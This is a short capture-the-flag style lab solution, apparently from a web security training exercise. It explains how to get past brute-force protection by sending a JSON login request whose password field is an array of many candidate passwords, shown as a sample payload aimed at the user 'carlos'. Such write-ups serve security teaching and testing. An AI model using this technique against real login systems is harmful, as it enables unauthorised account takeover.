# Broken brute-force protection, multiple credentials per request
Solution:
- Notice that the login request is sent as JSON
- Change the login request to add multiple passwords in the password parameter (set it as an array)
```json
{
"username": "carlos",
"password": [
	"password1",
	"password2",
	"password3",
	"password4",
	...
	...
	]
}
```
- Make the login request and notice that we can successfully login